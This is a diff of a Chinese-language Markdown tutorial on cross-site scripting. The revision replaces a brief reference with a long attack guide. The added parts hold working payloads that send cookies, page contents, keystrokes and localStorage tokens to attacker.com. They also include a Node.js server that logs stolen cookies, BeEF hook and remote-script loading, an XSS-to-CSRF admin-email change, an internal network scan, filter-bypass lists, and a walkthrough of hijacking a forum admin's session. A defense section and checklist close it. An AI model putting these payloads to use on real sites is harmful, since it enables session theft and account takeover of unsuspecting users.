@@ -1,83 +1,462 @@
 # XSS 跨站脚本攻击与修复方案
 
-## 1. 三大类型
+---
 
-| 类型 | 描述 | 特征 |
-|------|------|------|
-| 反射型 XSS | 恶意脚本藏在 URL，被服务端拼接到 HTML 中返回 | 需要用户点击恶意链接 |
-| 存储型 XSS | 恶意脚本被存入数据库，后续访问都会被执行 | 危害最大，无需社工诱导 |
-| DOM 型 XSS | 纯前端 JS 解析 URL/输入并写入 DOM，不经过服务端 | 特征是页面源码中没有 payload，需在 DOM 中查看 |
+## 📋 目录
 
-## 2. 经典 Payload 速查
+1. [XSS 基础与分类](#一xss-基础)
+2. [反射型 XSS](#二反射型-xss)
+3. [存储型 XSS](#三存储型-xss)
+4. [DOM 型 XSS](#四dom-型-xss)
+5. [XSS 绕过技巧大全](#五xss-绕过技巧)
+6. [XSS 高阶利用](#六xss-高阶利用)
+7. [自动化检测工具](#七自动化检测)
+8. [完整案例：某论坛存储型XSS](#八完整案例)
+9. [防御方案](#九防御方案)
+10. [排错指南](#十排错指南)
 
-```html
-<script>alert(document.domain)</script>
-<img src=x onerror=alert(1)>
-<svg/onload=alert(1)>
-<iframe src="javascript:alert(1)"></iframe>
-<a href="javascript:alert(1)">click</a>
-<body onload=alert(1)>
-<input autofocus onfocus=alert(1)>
-<details open ontoggle=alert(1)>
-<math><mtext></mtext><img onerror=alert(1) src=x></math>
+---
 
-<!-- 长度限制 -->
-<script>eval(name)</script>          # 把 payload 放在 window.name
-<img src=x onerror=eval.call(null,location.hash.slice(1))>
+## 一、XSS 基础
 
-<!-- Bypass 过滤 -->
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<img src="x" onerror="a=alert,a`1`">
-<img src=x onerror=&#97;lert(1)>
-<img src=x onerror=eval('\x61\x6c\x65\x72\x74(1)')>
+```
+XSS (Cross-Site Scripting) = 跨站脚本攻击
+
+原理：攻击者向网页注入恶意 JavaScript
+      → 其他用户访问该页面时执行恶意代码
+
+三大分类：
+  反射型 XSS: 恶意脚本在URL参数中，服务端"反射"回页面
+  存储型 XSS: 恶意脚本存储在数据库，所有访问者触发
+  DOM 型 XSS:  恶意脚本在客户端执行，不经过服务端
+
+危害等级：
+  反射型 → Medium (需要点击链接)
+  存储型 → High/Critical (所有访问者受影响)
+  DOM型 → 取决于影响范围
 ```
 
-## 3. Bypass 常见过滤
+---
 
-- **关键字 `script` 被过滤**：使用 SVG/img/onerror 事件触发
-- **引号被过滤**：使用反引号 `` ` `` 或不用引号
-- **空格被过滤**：使用 `/`、`%09`、`%0a`、`/**/` 等替代
-- **`alert` 被过滤**：`confirm`、`prompt`、`top['ale'+'rt']`、`window[atob('YWxlcnQ=')]`
-- **HTML 实体编码 / URL 编码 / Unicode 编码**
-- **CSP 绕过**：JSONP 端点、`unsafe-inline`、`base-uri` 缺陷、`object-src` 缺失
+## 二、反射型 XSS
 
-## 4. DOM XSS sink 速查
+### 2.1 漏洞代码与利用
 
-JavaScript 中可能导致 DOM XSS 的危险函数：
+```php
+// ❌ 危险：直接输出用户输入
+echo "搜索: " . $_GET['keyword'];
 
-- `document.write()`、`document.writeln()`
-- `element.innerHTML`、`outerHTML`
-- `element.src = javascript:...`
-- `eval()`、`setTimeout(string)`、`setInterval(string)`、`new Function()`
-- `location`、`document.location`、`window.open()`
-- `jQuery.html()`、`.append()`、`.prepend()`、`.after()`、`.before()`
+// 访问: /search.php?keyword=<script>alert(1)</script>
+// → 弹出 alert(1)
+```
 
-来源（source）：`location.hash`、`location.search`、`document.referrer`、`window.name`、`postMessage`、`localStorage`
+### 2.2 完整探测流程
 
-## 5. 业务场景案例
+```bash
+# ===== Step 1: 寻找注入点 =====
+# 测试每个参数：
+# ?q=test → 页面中出现 "test" → 候选点
+# ?name=test → 页面中出现 "Hello test" → 候选点
+# ?id=1 → 页面中出现 "Product 1" → 候选点
 
-- **评论/留言板**：存储型 XSS，最经典场景
-- **搜索框**：`?q=<script>`，典型反射型
-- **用户资料头像 URL**：`" onerror=alert(1) "`
-- **富文本编辑器**：需严格白名单过滤 HTML 标签与属性
-- **URL 参数回显**：如 `?redirect=...`、`?msg=登录失败`
-- **自定义错误页**：回显路径，`404 /<script>alert(1)</script>`
+# ===== Step 2: 注入测试Payload =====
+# 基础测试（是否过滤特殊字符）：
+"<h1>test</h1>     # 看是否渲染为HTML
+"<script>alert(1)</script>
+"'><script>alert(1)</script>
+';alert(1)//
 
-## 6. 修复方案
+# ===== Step 3: 确认XSS类型 =====
+# 反射型: Payload在URL中，每次请求触发
+# 存储型: Payload存入数据库，所有访问者触发
+# DOM型: Payload不经过服务端，JavaScript处理触发
 
-1. **对不可信输入做 HTML 编码**（`&` → `&amp;`、`<` → `&lt;`、`>` → `&gt;`、`"` → `&quot;`、`'` → `&#x27;`）
-2. **使用安全模板引擎**：React/Angular/Vue 默认转义；避免 `v-html` / `dangerouslySetInnerHTML` / `ng-bind-html`
-3. **富文本场景使用白名单过滤**：`DOMPurify`、`Jsoup` 的 Safelist
-4. **Cookie 设置 HttpOnly / Secure / SameSite**，降低会话劫持影响
-5. **CSP 响应头**：
-   ```
-   Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
-   ```
-6. **设置 `X-XSS-Protection: 1; mode=block`（已被大部分浏览器废弃，建议依赖 CSP）**
-7. **输入校验 + 输出编码 双重防线**
+# ===== Step 4: 构造最终Payload =====
+# 窃取Cookie:
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+# → 攻击者服务器收到受害者的Cookie
 
-## 7. 快速检测
+# 窃取页面内容:
+<script>fetch('http://attacker.com/steal?d='+btoa(document.body.innerHTML))</script>
 
-- **自动化**：Xray / Burp Active Scanner / OWASP ZAP / `xsstrike.py`
-- **人工速查**：在输入框填入 `"><script>alert(1)</script>`、`"><img src=x onerror=alert(1)>`、`javascript:alert(1)`
-- **Chrome DevTools**：Console 查看报错，Elements 查看 DOM
+# 键盘记录:
+<script>
+document.onkeypress = function(e) {
+    fetch('http://attacker.com/keys?k=' + e.key);
+};
+</script>
+```
+
+---
+
+## 三、存储型 XSS
+
+### 3.1 漏洞代码
+
+```php
+// ❌ 论坛发帖功能
+$content = $_POST['content'];  // 用户输入 "nice post!<script>...</script>"
+$sql = "INSERT INTO posts (content) VALUES ('$content')";
+mysqli_query($conn, $sql);
+
+// 显示帖子
+$result = mysqli_query($conn, "SELECT content FROM posts");
+while ($row = mysqli_fetch_assoc($result)) {
+    echo $row['content'];  // ⚠️ 直接输出！XSS触发！
+}
+```
+
+### 3.2 XSS 平台搭建
+
+```javascript
+// 自建XSS接收平台 (Node.js)
+// server.js
+const express = require('express');
+const app = express();
+
+// 接收Cookies
+app.get('/steal', (req, res) => {
+    const cookie = req.query.c;
+    const ip = req.ip;
+    console.log(`[+] Cookie from ${ip}: ${cookie}`);
+    fs.appendFileSync('stolen.txt', `${new Date().toISOString()} | ${ip} | ${cookie}\n`);
+    res.send(''); // 不返回任何内容（隐蔽）
+});
+
+// 接收页面截图（用HTML2Canvas）
+app.post('/screenshot', express.json({limit: '10mb'}), (req, res) => {
+    const img = req.body.img;
+    require('fs').writeFileSync(`screenshots/${Date.now()}.png`, img, 'base64');
+    res.send('');
+});
+
+app.listen(80);
+```
+
+### 3.3 Beef 框架
+
+```bash
+# Beef (Browser Exploitation Framework)
+# 下载: https://github.com/beefproject/beef
+cd beef
+./install
+./beef
+
+# 默认: http://127.0.0.1:3000/ui/panel (beef:beef)
+
+# Hook 代码：
+<script src="http://attacker.com:3000/hook.js"></script>
+# → 受害者浏览器被Hook → Beef控制台可执行300+模块：
+#   - 窃取Cookie
+#   - 键盘记录
+#   - 截图
+#   - 浏览器指纹
+#   - 浏览器漏洞利用
+#   - 社会工程弹窗(伪造登录框)
+#   - 局域网端口扫描(通过WebSocket)
+```
+
+---
+
+## 四、DOM 型 XSS
+
+### 4.1 漏洞代码
+
+```javascript
+// ❌ 危险：innerHTML 输出用户输入
+var hash = location.hash.substring(1);
+document.getElementById('content').innerHTML = hash;
+// 访问: /page.html#<img src=x onerror=alert(1)>
+
+// ❌ 危险：eval 执行用户输入
+eval(location.hash.substring(1));
+
+// ❌ 危险：document.write
+document.write('Hello ' + location.search.split('=')[1]);
+
+// ❌ 危险：jQuery html()
+$('#content').html(location.hash.substring(1));
+```
+
+### 4.2 DOM XSS Sources & Sinks
+
+```
+Sources（用户输入源）:
+  location / location.hash / location.search
+  document.URL / document.documentURI
+  window.name
+  document.referrer
+  postMessage event.data
+
+Sinks（危险输出点）:
+  innerHTML / outerHTML
+  document.write / document.writeln
+  eval / setTimeout / setInterval
+  javascript: URL
+  jQuery html() / append()
+  window.open()
+```
+
+---
+
+## 五、XSS 绕过技巧大全
+
+### 5.1 标签绕过（<script> 被过滤）
+
+```html
+<!-- 1. img 标签 -->
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+
+<!-- 2. svg 标签 -->
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+
+<!-- 3. body 标签 -->
+<body onload=alert(1)>
+
+<!-- 4. input 标签 -->
+<input onfocus=alert(1) autofocus>
+
+<!-- 5. details 标签（无需用户交互）-->
+<details open ontoggle=alert(1)>
+
+<!-- 6. video 标签 -->
+<video><source onerror=alert(1)>
+
+<!-- 7. marquee 标签（IE/旧Edge）-->
+<marquee onstart=alert(1)>
+
+<!-- 8. 自定义标签 -->
+<xss onmouseover=alert(1)>hover me</xss>
+```
+
+### 5.2 关键字绕过
+
+```javascript
+// alert 被过滤
+<svg onload=confirm(1)>
+<svg onload=prompt(1)>
+<svg onload=top.alert(1)>
+<svg onload=window['alert'](1)>
+<svg onload=self[atob('YWxlcnQ=')](1)>
+
+// 括号被过滤
+<svg onload=alert`1`>
+<svg onload=setTimeout`alert\`1\``>
+
+// 冒号被过滤
+<svg onload=alert(1)>
+// 用 javascript: 伪协议：
+<a href="javascript:alert(1)">x</a>
+
+// . 被过滤
+// 属性值可拼接：
+<img src=x onerror="a=alert;a(1)">
+```
+
+### 5.3 编码绕过
+
+```html
+<!-- HTML实体编码 -->
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+
+<!-- URL编码 -->
+<a href="javascript:%61%6c%65%72%74(1)">x</a>
+
+<!-- Unicode编码 -->
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+
+<!-- Base64 (需eval配合) -->
+<svg onload="eval(atob('YWxlcnQoMSk='))">
+
+<!-- 大小写混淆 -->
+<IMg SrC=x OnErRoR=alert(1)>
+<SCRIPT>alert(1)</SCRIPT>
+
+<!-- 制表符/换行分隔 -->
+<svg
+onload
+=alert(1)
+>
+```
+
+### 5.4 长度限制绕过
+
+```html
+<!-- 超短Payload (15字符内) -->
+<svg onload=eval(name)>  <!-- 配合 window.name 注入长代码 -->
+
+<!-- 远程加载 -->
+<script src="http://evil.com/e.js"></script>  <!-- 21字符 -->
+
+<!-- 利用已有代码 -->
+<script>eval(top.name)</script>  <!-- 从 window.name 读取代码 -->
+```
+
+---
+
+## 六、XSS 高阶利用
+
+### 6.1 窃取 JWT Token
+
+```javascript
+// 窃取 localStorage 中的 Token
+<script>
+fetch('http://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+        token: localStorage.getItem('auth_token'),
+        user: document.querySelector('.username').innerText
+    })
+});
+</script>
+```
+
+### 6.2 XSS → CSRF
+
+```javascript
+// 通过 XSS 触发敏感操作
+<script>
+// 修改管理员邮箱
+fetch('/admin/settings', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({email: 'attacker@evil.com'}),
+    credentials: 'include'
+});
+</script>
+```
+
+### 6.3 内网穿透
+
+```javascript
+// 通过 XSS 扫描受害者内网
+var img = new Image();
+for (var i = 1; i < 255; i++) {
+    img.src = 'http://192.168.1.' + i + ':8080/favicon.ico';
+    img.onload = function() {
+        fetch('http://attacker.com/log?ip=' + this.src);
+    };
+    img.onerror = function() {};
+}
+```
+
+---
+
+## 七、自动化检测
+
+```bash
+# XSStrike — 智能XSS检测+绕过
+git clone https://github.com/s0md3v/XSStrike
+cd XSStrike
+python xsstrike.py -u "https://xxx.com/search?q=test"
+
+# dalfox — 快速XSS扫描
+dalfox url https://xxx.com/search?q=test
+dalfox file targets.txt
+
+# 浏览器插件：
+# HackBar (Firefox/Chrome) — 快速编码/解码
+```
+
+### Burp Suite XSS 检测
+
+```
+Burp Suite 主动扫描 — XSS检测器
+Dashboard → New Scan → 勾选 "Cross-site scripting"
+
+手动技巧：
+  Intruder → Payload Positions → 注入点标记
+  Payloads → 导入 XSS 字典
+  Grep - Match → 添加 "<script>alert"
+  → 发起攻击 → 查看哪些返回含注入Payload
+```
+
+---
+
+## 八、完整案例：论坛存储型 XSS
+
+```
+目标: 某技术论坛 community.xxx.com
+
+Step 1: 基础探测
+  注册账号→发帖: <h1>test</h1>
+  → 标题渲染为<h1>test</h1> → 存在HTML注入
+
+Step 2: XSS测试
+  发帖: <img src=x onerror=alert(1)>
+  → 刷新页面 → 弹窗! → 确认存储型XSS!
+  → 所有访问该帖子的用户都会触发
+
+Step 3: Cookie窃取
+  搭建接收服务器(attacker.com)
+  发帖正文:
+    <img src=x onerror="
+      var i=new Image();
+      i.src='http://attacker.com/steal?c='+document.cookie
+    ">
+  → 5分钟后服务器收到第一条Cookie:
+  PHPSESSID=abc123def456; user_id=123; role=user
+
+Step 4: 提升影响
+  → 私信管理员诱导点击该帖
+  → 管理员Cookie:
+  PHPSESSID=admin_session_xxx; user_id=1; role=admin
+  → 用管理员Cookie登录 → 获得后台管理权限
+
+漏洞等级: Critical (CVSS 9.0)
+影响: 可窃取所有访问该帖子的用户Cookie
+修复: 输出前HTML实体编码 → htmlspecialchars()
+```
+
+---
+
+## 九、防御方案
+
+```php
+// ✅ 输出编码（最重要）
+echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+
+// ✅ 内容安全策略 (CSP)
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+// 禁止内联脚本和执行外部脚本
+
+// ✅ HttpOnly Cookie
+setcookie('session', $value, [
+    'httponly' => true,  // JavaScript无法读取
+    'secure' => true,     // 仅HTTPS传输
+    'samesite' => 'Strict'
+]);
+
+// ✅ 输入验证（白名单）
+if (!preg_match('/^[a-zA-Z0-9 ]+$/', $input)) {
+    die('非法输入');
+}
+
+// ✅ 模板引擎自动转义
+// Twig: {{ user_input }} → 自动HTML转义
+// Jinja2: {{ user_input|e }}
+// React JSX: 默认转义，危险: dangerouslySetInnerHTML
+
+// ✅ DOMPurify (客户端HTML消毒)
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.0/purify.min.js"></script>
+var clean = DOMPurify.sanitize(dirty);  // 只保留安全的HTML标签
+```
+
+---
+
+## ✅ Checklist
+
+**检测**
+- [ ] 测试所有用户输入点（GET/POST/Cookie/Header）
+- [ ] 测试 `<script>`、`<img>`、`<svg>` 等标签
+- [ ] 测试编码绕过（HTML实体/URL/Unicode）
+- [ ] 测试 WAF 绕过
+
+**防御**
+- [ ] 输出时 HTML 实体编码
+- [ ] 设置 CSP 头
+- [ ] Cookie 设置 HttpOnly + Secure
+- [ ] 输入白名单验证
+- [ ] 使用模板引擎自动转义（不用 innerHTML）
